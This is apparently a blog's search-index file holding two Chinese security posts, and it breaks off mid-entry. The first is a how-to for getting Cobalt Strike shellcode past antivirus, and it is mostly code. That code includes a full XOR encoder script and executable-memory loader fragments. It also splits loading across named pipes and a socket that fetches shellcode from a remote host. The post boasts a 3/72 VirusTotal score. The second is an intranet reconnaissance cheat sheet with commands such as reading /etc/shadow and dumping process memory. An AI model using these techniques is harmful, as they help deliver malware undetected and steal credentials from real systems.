<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>静态恶意代码逃逸</title>
      <link href="2022/10/17/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/"/>
      <url>2022/10/17/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="静态恶意代码逃逸"><a href="#静态恶意代码逃逸" class="headerlink" title="静态恶意代码逃逸"></a>静态恶意代码逃逸</h1><p>最近在学习从底层去实现免杀，而看到了关于静态恶意代码逃逸的一些很好的文章，在此记录总结一下</p><a id="more"></a><h2 id="恶意代码与shellcode"><a href="#恶意代码与shellcode" class="headerlink" title="恶意代码与shellcode"></a>恶意代码与shellcode</h2><p>Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode</p><h2 id="CS生成的raw文件与C文件"><a href="#CS生成的raw文件与C文件" class="headerlink" title="CS生成的raw文件与C文件"></a>CS生成的raw文件与C文件</h2><p>在CS中，生成的Shellcode可以为raw文件和C文件<br><img src="https://s2.loli.net/2022/10/17/7hBy9ialGgvKAfj.png" alt="raw"><br><img src="https://s2.loli.net/2022/10/17/aLuKOBbCd7TNWwv.png" alt="C"><br>在英文中，raw可以被译为 生的，未加工的，而CS生成出来的就是bin文件，故raw文件是可以直接进行字节操作读取的，因此加载到内存较为方便<br>而C文件给出的是一个C语言中的字符数组，也是可以通过以字节单位操作的</p><h3 id="对于载荷的混淆"><a href="#对于载荷的混淆" class="headerlink" title="对于载荷的混淆"></a>对于载荷的混淆</h3><p>核心思想是将shellcode进行混淆，而这里我们使用的是XOR</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">new_shellcode = <span class="hljs-built_in">ord</span>(old_shellcode) ^ key<br></code></pre></td></tr></table></figure><p>这里贴一下大佬的代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser, FileType<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_bin</span>(<span class="hljs-params">num, src_fp, dst_fp, dst_raw</span>):</span><br>    shellcode = <span class="hljs-string">&#x27;&#x27;</span><br>    shellcode_size = <span class="hljs-number">0</span><br>    shellcode_raw = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            code = src_fp.read(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> code:<br>                <span class="hljs-keyword">break</span><br><br>            base10 = <span class="hljs-built_in">ord</span>(code) ^ num<br>            base10_str = <span class="hljs-built_in">chr</span>(base10)<br>            shellcode_raw += base10_str.encode()<br>            code_hex = <span class="hljs-built_in">hex</span>(base10)<br>            code_hex = code_hex.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(code_hex) == <span class="hljs-number">1</span>):<br>                code_hex = <span class="hljs-string">&#x27;0&#x27;</span> + code_hex<br>            shellcode += <span class="hljs-string">&#x27;\\x&#x27;</span> + code_hex<br>            shellcode_size += <span class="hljs-number">1</span><br>        src_fp.close()<br>        dst_raw.write(shellcode_raw)<br>        dst_raw.close()<br>        dst_fp.write(shellcode)<br>        dst_fp.close()<br>        <span class="hljs-keyword">return</span> shellcode_size<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        sys.stderr.writelines(<span class="hljs-built_in">str</span>(e))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    parser = ArgumentParser(prog=<span class="hljs-string">&#x27;Shellcode X&#x27;</span>, description=<span class="hljs-string">&#x27;[XOR The Cobaltstrike PAYLOAD.BINs] \t &gt; Author: rvn0xsy@gmail.com&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-v&#x27;</span>,<span class="hljs-string">&#x27;--version&#x27;</span>,nargs=<span class="hljs-string">&#x27;?&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>,<span class="hljs-string">&#x27;--src&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;source bin file&#x27;</span>,<span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;rb&#x27;</span>), required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-d&#x27;</span>,<span class="hljs-string">&#x27;--dst&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;destination shellcode file&#x27;</span>,<span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;w+&#x27;</span>),required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-n&#x27;</span>,<span class="hljs-string">&#x27;--num&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;Confused number&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">90</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-r&#x27;</span>,<span class="hljs-string">&#x27;--raw&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;output bin file&#x27;</span>, <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;wb&#x27;</span>), required=<span class="hljs-literal">True</span>)<br>    args = parser.parse_args()<br>    shellcode_size = process_bin(args.num, args.src, args.dst, args.raw)<br>    sys.stdout.writelines(<span class="hljs-string">&quot;[+]Shellcode Size : &#123;&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(shellcode_size))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><code>python3 .\xor_shellcoder.py -s .\payload.bin  -d payload.c -n 10 -r out.bin</code></p><h3 id="内存混淆加载"><a href="#内存混淆加载" class="headerlink" title="内存混淆加载"></a>内存混淆加载</h3><p>Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。<br>而在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。<br>申请方式有我们比较熟悉的<code>malloc,new</code>,而后续我们可能用到更多的是<code>VirtualAlloc</code>，其申请内存的单位为”页”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<span class="hljs-comment">//基址</span><br>    shellcode_size,<span class="hljs-comment">//大小</span><br>    MEM_COMMIT,<span class="hljs-comment">//内存页状态,申请新的内存，保留原来的块(只能在原来的块上提交)</span><br>    PAGE_EXECUTE_READWRITE<span class="hljs-comment">//可读可写可执行</span><br>    );<br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br></code></pre></td></tr></table></figure><h3 id="优化内存申请"><a href="#优化内存申请" class="headerlink" title="优化内存申请"></a>优化内存申请</h3><p>在申请内存页时，将其权限更改，因为直接赋予一个新内存可读可写可执行时的权限时，很容易被杀软查杀，所以我们可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_READWRITE <span class="hljs-comment">// 只申请可读可写</span><br>    );<br><br>    <span class="hljs-comment">// 将shellcode复制到可读可写的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><br><span class="hljs-comment">// 这里开始更改它的属性为可执行</span><br>VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);<br></code></pre></td></tr></table></figure><h3 id="优化混淆"><a href="#优化混淆" class="headerlink" title="优化混淆"></a>优化混淆</h3><p>我们之前在混淆Shellcode时，用到的是异或运算，常常杀软会对这种异或操作比较敏感，而在windows核心编程中，有相应的API可以直接使用，有<code>InterlockedXorRelease</code>该函数，可以直接用于两个值的异或运算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;shellcode_size; i++)&#123;<br>    _InterlockedXor8(buf+i,<span class="hljs-number">10</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分离免杀与管道通信"><a href="#分离免杀与管道通信" class="headerlink" title="分离免杀与管道通信"></a>分离免杀与管道通信</h3><p>分离免杀指的是将恶意代码放置在程序本身之外的一种加载方式，这个很好理解，主要是管道通信，简单的解释是：通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节<br>但这么解释还是比较抽象<br>首先我们先考虑进程通信的目的</p><ul><li>数据传输：一个进程需要将它的数据发送给另一个进程</li><li>资源共享：多个进程之间共享同样的资源。</li><li>通知事件：一个进程需要向另一个或一组进程发送消息，通知它（它们）发生了某种事件（如进程终止时要通知父进程）。</li><li>进程控制：有些进程希望完全控制另一个进程的执行（如Debug进程），此时控制进程希望能够拦截另一个进程的所有陷入和异常，并能够及时知道它的状态改变。</li></ul><p>而管道则是管道是Unix中最古老的进程间通信的形式，我们把从一个进程连接到另一个进程的一个数据流称为一个“管道 ”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-comment">//功能:创建一个无名管道</span><br><span class="hljs-comment">//函数原型</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd[<span class="hljs-number">2</span>])</span></span>;<br><span class="hljs-comment">//参数</span><br><span class="hljs-comment">//fd：文件描述符数组,其中fd[0]表示读端, fd[1]表示写端</span><br><span class="hljs-comment">//返回值:成功返回0，失败返回-1</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/10/17/fhkzOLd82j46Nlp.png" alt="管道通信"></p><p>因此，我们尝试使用管道通信，我们的目的主要是通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程，下面分别为服务端与客户端，管道通信核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">recv</span><span class="hljs-params">()</span></span>&#123;<br>HANDLE hPipeClient;<br>    DWORD dwWritten;<br>    DWORD dwShellcodeSize = <span class="hljs-keyword">sizeof</span>(buf);<br>    <span class="hljs-comment">// 等待管道可用</span><br>    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);<br>    <span class="hljs-comment">// 连接管道</span><br>    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="hljs-literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">hPipe = CreateNamedPipe(<br>        ptsPipeName,<br>        PIPE_ACCESS_INBOUND,<br>        PIPE_TYPE_BYTE| PIPE_WAIT,<br>        PIPE_UNLIMITED_INSTANCES,<br>        BUFF_SIZE,<br>        BUFF_SIZE,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><h3 id="优化管道通信"><a href="#优化管道通信" class="headerlink" title="优化管道通信"></a>优化管道通信</h3><p>在一个程序里同时启动两个管道通信端口进行传输，还是很容易被查杀，下面尝试用网络套接字（SOCKET）来进行通信，将两个管道通信端分开编译<br>服务端核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>WSADATA wsaData;<br>SOCKET socks;<br>SOCKET sClient;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">s_client</span>;</span><br>INT nAddrLen = <span class="hljs-keyword">sizeof</span>(s_client);<br>SHORT sListenPort = <span class="hljs-number">8888</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br></code></pre></td></tr></table></figure><p>客户端核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>WSADATA wsaData;<br>SOCKET socks;<br>SHORT sListenPort = <span class="hljs-number">8888</span>;<br><span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br><span class="hljs-built_in">sin</span>.sin_port = htons(sListenPort);<br><span class="hljs-built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="hljs-string">&quot;192.168.170.1&quot;</span>);<br></code></pre></td></tr></table></figure><p>在利用网络套接字的管道通信下分开编译，此时的免杀效果已经十分显著了，3/72<br><img src="https://s2.loli.net/2022/10/17/bXyrWgxY1jzoIJG.png" alt="virustotal"></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透_信息收集</title>
      <link href="2022/10/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2022/10/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>对于内网渗透学习的笔记记录</p><a id="more"></a><h2 id="内网组成"><a href="#内网组成" class="headerlink" title="内网组成"></a>内网组成</h2><ul><li>容器</li><li>云服务</li><li>路由器</li><li>服务器</li><li>打印机</li><li>交换机</li><li>k8s集群</li><li>Openstack</li><li>Linux系统</li><li>MacOS系统</li><li>Windows系统</li><li>Windows AD域</li></ul><h2 id="内网渗透思路"><a href="#内网渗透思路" class="headerlink" title="内网渗透思路"></a>内网渗透思路</h2><ul><li>公网-&gt;内网</li><li>信息搜集</li><li>漏洞扫描</li><li>漏洞挖掘</li><li>漏洞利用</li><li>开始攻击</li><li>权限维持</li><li>持 久 化</li><li>权限提升</li><li>免杀隐藏</li><li>横向移动</li><li>痕迹清理</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">whoami<br>who/w<br>id<br>finger<br>cat <span class="hljs-regexp">/etc/</span>passwd<br>cat <span class="hljs-regexp">/etc/</span>shadow<br>cat <span class="hljs-regexp">/etc/g</span>shadow<br>cat <span class="hljs-regexp">/etc/g</span>roup<br></code></pre></td></tr></table></figure><h4 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h4><ol><li>进程信息<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> aux<br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-efl</span><br>top<br>pstree <span class="hljs-literal">-aup</span><br></code></pre></td></tr></table></figure></li><li>端口进程<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> lsof -i:<span class="hljs-number">22</span><br><span class="hljs-attribute">sudo</span> netstat -tunlp | grep <span class="hljs-number">53</span><br></code></pre></td></tr></table></figure></li><li>关闭进程<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> PID<br></code></pre></td></tr></table></figure><h4 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h4></li><li>主机名称<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">uname -a</span><br></code></pre></td></tr></table></figure></li><li>内核版本<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">uname -srm<br>hostnamectl<br>hostnamectl | <span class="hljs-keyword">grep</span> -i kernel<br>cat <span class="hljs-regexp">/proc/</span>version<br></code></pre></td></tr></table></figure></li><li>CPU信息<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">lscpu<br>cat <span class="hljs-regexp">/proc/</span>cpuinfo<br></code></pre></td></tr></table></figure></li><li>内存信息<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">free -m -w<br>cat <span class="hljs-regexp">/proc/m</span>eminfo <br></code></pre></td></tr></table></figure></li><li>交换分区<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">free -m -w<br>cat <span class="hljs-regexp">/proc/m</span>eminfo <br></code></pre></td></tr></table></figure></li><li>环境变量<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">set</span><br></code></pre></td></tr></table></figure><h4 id="启动信息"><a href="#启动信息" class="headerlink" title="启动信息"></a>启动信息</h4></li></ol><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">schtasks</span><br></code></pre></td></tr></table></figure><h4 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>password<br>cat <span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure><h4 id="票据信息"><a href="#票据信息" class="headerlink" title="票据信息"></a>票据信息</h4><h4 id="磁盘信息"><a href="#磁盘信息" class="headerlink" title="磁盘信息"></a>磁盘信息</h4><h4 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h4><ol><li>查看网络信息<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure></li><li>查看host信息<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure></li><li>查看网卡信息<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ifconfig<br>arp -a<br>route print<br>netstat -anot<br>Get-NetTCPConnection<br></code></pre></td></tr></table></figure><h4 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h4></li></ol><h4 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> query<br>wmic service list brief<br><span class="hljs-built_in">Get-WmiObject</span> win32_service | <span class="hljs-built_in">select</span> PathName<br></code></pre></td></tr></table></figure><h4 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h4><h4 id="软件信息"><a href="#软件信息" class="headerlink" title="软件信息"></a>软件信息</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span>,<span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><h4 id="驱动信息"><a href="#驱动信息" class="headerlink" title="驱动信息"></a>驱动信息</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">DRIVERQUERY</span><br></code></pre></td></tr></table></figure><h4 id="后缀信息"><a href="#后缀信息" class="headerlink" title="后缀信息"></a>后缀信息</h4><h4 id="注册表信息"><a href="#注册表信息" class="headerlink" title="注册表信息"></a>注册表信息</h4><h4 id="防火墙信息"><a href="#防火墙信息" class="headerlink" title="防火墙信息"></a>防火墙信息</h4><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="用户信息-1"><a href="#用户信息-1" class="headerlink" title="用户信息"></a>用户信息</h4><ol><li>用户名称<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> 查看当前用户名称<br>whoami 查看当前用户名称 <br>quser（query <span class="hljs-keyword">user</span>） 查看当前用户名称<br>wmic useraccount <span class="hljs-keyword">get</span> /<span class="hljs-keyword">ALL</span> /<span class="hljs-keyword">format</span>:csv<br></code></pre></td></tr></table></figure></li><li>用户权限<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup administrators<br></code></pre></td></tr></table></figure><h4 id="进程信息-1"><a href="#进程信息-1" class="headerlink" title="进程信息"></a>进程信息</h4></li><li>查看进程<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">tasklist</span><br><span class="hljs-string">get</span>-<span class="hljs-string">process</span><br><span class="hljs-string">wmic</span> <span class="hljs-string">process</span> <span class="hljs-string">get</span> <span class="hljs-string">caption</span>,<span class="hljs-string">executablepath</span>,<span class="hljs-string">commandline</span> /<span class="hljs-string">format:csv</span><br></code></pre></td></tr></table></figure></li><li>筛选进程<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">tasklist</span> | <span class="hljs-string">findstr</span> <span class="hljs-string">&quot;explorer.exe&quot;</span><br><span class="hljs-string">tasklist</span> /<span class="hljs-string">fi</span> <span class="hljs-string">&quot;ImageName eq explorer.exe&quot;</span><br><span class="hljs-built_in">get-process</span> | <span class="hljs-string">findstr</span> <span class="hljs-string">&quot;explorer.exe&quot;</span><br></code></pre></td></tr></table></figure></li><li>进程端口<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -ano <span class="hljs-string">| findstr &quot;</span><span class="hljs-number">80</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure></li><li>进程内存<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">procdump</span>  <span class="hljs-comment">#利用工具</span><br></code></pre></td></tr></table></figure></li><li>进程权限<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br></code></pre></td></tr></table></figure></li><li>进程模块<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/fi</span> <span class="hljs-string">&quot;ImageName eq explorer.exe&quot;</span> <span class="hljs-string">/m</span><br></code></pre></td></tr></table></figure></li><li>模块搜索<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /<span class="hljs-keyword">fi</span> <span class="hljs-string">&quot;MODULES eq capauthz.dll&quot;</span><br></code></pre></td></tr></table></figure><h4 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h4></li><li>主机名称<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">hostname<br>[<span class="hljs-symbol">System.Net.DNS</span>]:<span class="hljs-link">:GetHostByName($Null)</span><br></code></pre></td></tr></table></figure><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4></li><li>查看变量<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">set</span><br></code></pre></td></tr></table></figure></li><li>设置变量<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">test</span>=Glacier 一次性<br>setx test <span class="hljs-string">&quot;Glacier&quot;</span> 永久<br></code></pre></td></tr></table></figure><h4 id="系统版本"><a href="#系统版本" class="headerlink" 